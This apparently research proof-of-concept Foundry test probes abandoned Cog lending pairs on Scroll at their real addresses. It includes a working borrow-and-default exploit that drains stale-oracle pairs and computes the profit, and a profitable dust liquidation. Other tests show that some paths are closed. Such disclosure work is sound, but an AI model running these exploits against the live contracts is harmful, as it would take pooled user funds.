// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20, ICogPair} from "../src/ICogPair.sol";

/// @title Cog (Scroll) zombie-hunt PoC — read-only research; fork-only, no mainnet txs.
/// @notice Verifies, against live Scroll state, what an unprivileged attacker can extract from
///         the abandoned Cog isolated-lending markets (paused + unpaused pairs) today.
///
///  Verified paths:
///   A. borrow-and-default on unpaused pairs whose oracle returns a stale ratio:
///      0x0C502351 (WETH/CRV) and 0xDeFeBD03 (rETH/USDC)
///   A'. negative: 0xAA230793's oracle reverts "Stale Price Feed" -> borrow reverts (closed)
///   B. profitable liquidation of small insolvent positions on the PAUSED pair
///      0x63FdAFA5 (USDC/WETH) — pause blocks deposits/borrows, not liquidations
///   C. the $142k WETH pair 0xA5832adC is paused -> new borrows/deposits revert
///   D. broken-scale-rate pair 0x8b606e4a has zero usable borrow capacity
///
/// Prices used for USD accounting (DefiLlama 2026-10-12): WETH 2531.70, rETH 2964.61,
/// USDC 1.00, CRV 0.3604 (bridged-parity price; Scroll CRV has no live DEX market).
contract CogZombieTest is Test {
    address constant ATTACKER = address(0xA11CE);

    address constant WETH = 0x5300000000000000000000000000000000000004;
    address constant USDC = 0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4;
    address constant CRV  = 0xB755039eDc7910C1F1BD985D48322E55A31AC0bF;
    address constant RETH = 0x53878B874283351D26d206FA512aEcE1Bef6C0dD;

    address constant P_WETH_CRV    = 0x0C502351461904cd9430EeFdc7b9df1c30E74032; // unpaused, oracle stale
    address constant P_RETH_USDC_2 = 0xDeFeBD03E8E339737f24B67737E9d002CB03f00b; // unpaused, oracle stale
    address constant P_RETH_USDC_1 = 0xAA230793737DDC517c2Db9e42CA3a65178edA6D0; // unpaused, oracle REVERTS
    address constant P_BIG_WETH_USDC = 0xA5832adC1e4487B635a483722e4fc34062467479; // paused, $142k WETH
    address constant P_USDC_WETH_LIQ = 0x63FdAFA50C09c49F594f47EA7194b721291ec50f; // paused, dust liqs
    address constant P_RETH_BROKEN = 0x8b606e4aa85281ed1cbeC2D25BAa6aB8F3541450; // oracle reverts

    // USD prices (1e18 scale)
    uint256 constant USD_WETH = 2531.70e18;
    uint256 constant USD_RETH = 2964.61e18;
    uint256 constant USD_USDC = 1.00e18;
    uint256 constant USD_CRV  = 0.3604e18;

    function setUp() public {
        string memory rpc = vm.envOr("SCROLL_FORK_RPC", string("https://rpc.scroll.io"));
        uint256 forkBlock = vm.envOr("SCROLL_FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, forkBlock);
        }
        vm.deal(ATTACKER, 1 ether);
        emit log_named_uint("fork_block", block.number);
    }

    function _usd(uint256 amount, uint256 price, uint8 dec) internal pure returns (uint256) {
        return (amount * price) / (10 ** dec);
    }

    /// A. borrow-and-default: deposit (stale-priced) collateral, borrow ALL pool asset, walk away.
    /// Note: debt booked by the pair includes the 0.05% borrow-opening fee, hence the 10005 factor.
    function _maxBorrowAttack(address pair, uint256 usdAsset, uint256 usdColl)
        internal
        returns (bool ok, uint256 assetOut, uint256 collIn)
    {
        ICogPair p = ICogPair(pair);
        address asset = p.asset();
        address coll = p.collateral();
        (, uint256 rate) = p.get_exchange_rate(); // refreshes stored rate from oracle (fork-only)
        uint256 B = IERC20(asset).balanceOf(pair); // live asset liquidity
        if (B == 0 || rate == 0) return (false, 0, 0);
        // solvency: coll*7.5e17 >= debt*rate, debt = B*1.0005  =>  need = ceil(B*10005*rate/(10000*7.5e17))
        uint256 need = (B * 10005 * rate) / (10000 * 75) / 1e16 + 2;
        deal(coll, ATTACKER, need);
        vm.startPrank(ATTACKER);
        IERC20(coll).approve(pair, need);
        p.add_collateral(ATTACKER, need);
        assetOut = p.borrow(B, ATTACKER, ATTACKER);
        vm.stopPrank();
        collIn = need;
        ok = assetOut == B && assetOut > 0;
        uint8 decA = IERC20(asset).decimals();
        uint8 decC = IERC20(coll).decimals();
        uint256 usdGot = _usd(assetOut, usdAsset, decA);
        uint256 usdPaid = _usd(collIn, usdColl, decC);
        emit log_named_address("pair", pair);
        emit log_named_uint("borrowed_asset_raw", assetOut);
        emit log_named_uint("collateral_spent_raw", collIn);
        emit log_named_uint("usd_borrowed", usdGot);
        emit log_named_uint("usd_collateral_cost", usdPaid);
        emit log_named_int("usd_net_profit", int256(usdGot) - int256(usdPaid));
    }

    function test_A_borrowAndDefault_WETH_CRV() public {
        (bool ok, uint256 got, ) = _maxBorrowAttack(P_WETH_CRV, USD_WETH, USD_CRV);
        assertTrue(ok, "no extraction on WETH/CRV pair");
        assertGt(got, 0.009e18, "extraction too small");
    }

    function test_A_borrowAndDefault_RETH_USDC() public {
        (bool ok, uint256 got, ) = _maxBorrowAttack(P_RETH_USDC_2, USD_RETH, USD_USDC);
        assertTrue(ok, "no extraction on rETH/USDC pair");
        assertGt(got, 0.001e18, "extraction too small");
    }

    /// A'. negative evidence: 0xAA230793's oracle has a staleness check and reverts now ->
    /// borrow (which refreshes the rate) reverts -> the $29.65 rETH in that pair is unreachable.
    function test_A_deadOracleBlocksBorrow() public {
        ICogPair p = ICogPair(P_RETH_USDC_1);
        (bool ok, ) = P_RETH_USDC_1.call(abi.encodeWithSelector(ICogPair.get_exchange_rate.selector));
        assertFalse(ok, "expected oracle stale revert");
        // direct physical check of what a caller sees today
        (bool ok2, ) = P_RETH_BROKEN.call(abi.encodeWithSelector(ICogPair.get_exchange_rate.selector));
        assertFalse(ok2, "expected oracle stale revert (broken pair)");

        uint256 B = IERC20(RETH).balanceOf(P_RETH_USDC_1);
        emit log_named_uint("unreachable_rETH_raw", B);
        deal(USDC, ATTACKER, 10_000e6);
        vm.startPrank(ATTACKER);
        IERC20(USDC).approve(P_RETH_USDC_1, 10_000e6);
        p.add_collateral(ATTACKER, 10_000e6);
        vm.expectRevert();
        p.borrow(1e14, ATTACKER, ATTACKER); // reverts on oracle refresh
        vm.stopPrank();
    }

    /// B. liquidation reality-check on paused pairs (pause() does not gate liquidate()).
    ///   B1 negative: 0x63FdAFA5 is a factory-2 pair; the deployed blueprint uses LTV = 85%
    ///      (Sourcify-verified), so its dust positions that looked liquidatable under the
    ///      repo's 75% constant are actually solvent -> liquidate reverts.
    ///   B2 positive: 0xA5832adC (factory-1, LTV = 75%, fork-probed) has 12 dust positions
    ///      liquidatable for a gross ~$0.13 total -- economically below gas.
    function test_B_liquidations() public {
        // B1: expect "User is solvent" on the factory-2 pair
        ICogPair p2 = ICogPair(P_USDC_WETH_LIQ);
        assertTrue(p2.paused(), "expected pair paused");
        address solventUser = 0xf522F0672107333dC549A8AcEDF62746844b65ce;
        deal(USDC, ATTACKER, 1_000e6);
        vm.startPrank(ATTACKER);
        IERC20(USDC).approve(P_USDC_WETH_LIQ, type(uint256).max);
        vm.expectRevert(bytes("CogPair: User is solvent"));
        p2.liquidate(solventUser, type(uint256).max, ATTACKER);
        vm.stopPrank();

        // B2: dust liquidation on the factory-1 pair (gross-positive, sub-gas)
        ICogPair p1 = ICogPair(P_BIG_WETH_USDC);
        address dustUser = 0xe58C3e6d99194932F241517bD79E8f42aafcA17e;
        deal(WETH, ATTACKER, 1e18);
        uint256 wethBefore = IERC20(WETH).balanceOf(ATTACKER);
        uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);
        vm.startPrank(ATTACKER);
        IERC20(WETH).approve(P_BIG_WETH_USDC, type(uint256).max);
        p1.liquidate(dustUser, type(uint256).max, ATTACKER);
        vm.stopPrank();
        uint256 paid = wethBefore - IERC20(WETH).balanceOf(ATTACKER); // WETH is the asset (debt)
        uint256 got = IERC20(USDC).balanceOf(ATTACKER) - usdcBefore;   // USDC is the collateral
        emit log_named_uint("dust_liq_paid_weth_raw", paid);
        emit log_named_uint("dust_liq_got_usdc_raw", got);
        assertGt(got, 0, "dust liquidation should return collateral");
        uint256 usdPaid = _usd(paid, USD_WETH, 18);
        uint256 usdGot = _usd(got, USD_USDC, 6);
        assertGt(usdGot, usdPaid, "dust liquidation should be gross-profitable");
    }

    /// C. the $142k WETH pair is paused: deposit/borrow revert; third-party withdraw needs allowance.
    function test_C_pausedPairBlocksUnprivilegedDepositAndBorrow() public {
        ICogPair p = ICogPair(P_BIG_WETH_USDC);
        assertTrue(p.paused(), "expected big pair paused");
        uint256 wethHeld = IERC20(WETH).balanceOf(P_BIG_WETH_USDC);
        emit log_named_uint("big_pair_weth_held_raw", wethHeld);
        assertGt(wethHeld, 50e18, "expected ~56 WETH still custodied");

        vm.startPrank(ATTACKER);
        vm.expectRevert(bytes("Pair Paused"));
        p.deposit(1e6, ATTACKER);
        vm.expectRevert(bytes("Pair Paused"));
        p.borrow(1e15, ATTACKER, ATTACKER);
        // cannot withdraw somebody else's LP shares without allowance
        address victim = 0xeeDa897DF145b78E332d21C4ee45648c5D83873f; // top LP holder
        vm.expectRevert(bytes("Insufficient Allowance"));
        p.withdraw(1e18, ATTACKER, victim);
        vm.stopPrank();
    }

    /// D. broken pair: stored rate ~1.7e21 (1e12x scale error) + dead oracle ->
    /// $100k USDC collateral could borrow < 1 wei of rETH even if the oracle worked.
    function test_D_brokenPairHasNoBorrowCapacity() public {
        ICogPair p = ICogPair(P_RETH_BROKEN);
        uint256 B = IERC20(RETH).balanceOf(P_RETH_BROKEN);
        uint256 rate = p.exchange_rate();
        uint256 capacity = (100_000e6 * 7.5e17) / rate; // rETH raw units borrowable with $100k USDC
        emit log_named_uint("broken_pair_rETH_held", B);
        emit log_named_uint("broken_pair_rate_stored", rate);
        emit log_named_uint("capacity_with_100k_usdc_raw", capacity);
        assertLt(capacity, 1e14, "expected near-zero capacity (1e12x scale error)");
        deal(USDC, ATTACKER, 100_000e6);
        vm.startPrank(ATTACKER);
        IERC20(USDC).approve(P_RETH_BROKEN, 100_000e6);
        p.add_collateral(ATTACKER, 100_000e6);
        vm.expectRevert();
        p.borrow(1e14, ATTACKER, ATTACKER); // oracle stale revert
        vm.stopPrank();
    }
}
